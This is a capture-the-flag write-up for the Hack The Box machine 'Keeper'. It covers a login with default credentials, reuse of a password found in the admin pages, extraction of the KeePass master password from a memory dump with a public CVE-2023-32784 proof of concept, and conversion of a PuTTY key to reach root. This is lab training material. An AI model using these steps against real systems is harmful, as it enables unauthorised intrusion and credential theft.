# Keeper Writeup
<figure><img src="../src/Keeper/card.png"></figure>

## Target IP-Address: 10.10.11.227

Nmap Scan: 

```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -vv 10.10.11.227
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKHZRUyrg9VQfKeHHT6CZwCwu9YkJosNSLvDmPM9EC0iMgHj7URNWV3LjJ00gWvduIq7MfXOxzbfPAqvm2ahzTc=
|   256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBe5w35/5klFq1zo5vISwwbYSVy1Zzy+K9ZCt0px+goO
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found `keeper.htb` but it kept pointing us to another url which was `tickets.keeper.htb`.

Once on tickets.keeper.htb, We can find a login page.

<figure><img src="../src/Keeper/loginpage.png"></figure>

So, starting with the basics, I tried some generic credentials and was able to get into the admin interface with `root:password`.

<figure><img src="../src/Keeper/adminpage.png"></figure>

## Enumeration

On exploring a little more, I found the initial password of Inorgaard to be `Welcome2023!`.

## User Flag

Since we got the credentials, Let's SSH into the user.

```
┌──(kali㉿kali)-[~]
└─$ ssh lnorgaard@keeper.htb
lnorgaard@keeper.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ 
```

Boom, We found the User Flag.

## Root Flag

We can see a zip file in the home directory `RT3000.zip`. On unzipping it, we find some interesting files.

<figure><img src="../src/Keeper/unzip.png"></figure>

To get these files on my machine. I started an python server and downloaded them.

After a bit of research, I ran into `CVE-2023-32784`.

So we can use Keepass dump masterkey

```
git clone https://github.com/CMEPW/keepass-dump-masterkey
```

After running that with the dump. We found an incomplete password

```
┌──(kali㉿kali)-[~/Desktop/tools/keepass-dump-masterkey]
└─$ python3 poc.py ../../../Downloads/KeePassDumpFull.dmp 
2023-12-18 00:59:44,753 [.] [main] Opened ../../../Downloads/KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

Since we know that the user is Danish. `●Mdgr●d med fl●de` can be decoded to `øMdgrød med fløde`.

And with a little bit of google search we end up with `rødgrød med fløde`.

Now let's try to crack the KeePass vault.

I use a web based KeePass client `https://app.keeweb.info/` and unlock the file with the above password.

I found the contents of a PuTTY PPK file for the root user.

<figure><img src="../src/Keeper/putty.png"></figure>

With `puttygen` we can convert the PPK to an id_rsa SSH private key.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ puttygen key.ppk -O private-openssh -o id_rsa
                                                                                                                        
┌──(kali㉿kali)-[~/Downloads]
└─$ chmod 600 id_rsa  
                                                                                                                        
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh -i id_rsa root@keeper.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# 
```

And with this the machine has been rooted.

Thank you!! Happy Hacking :D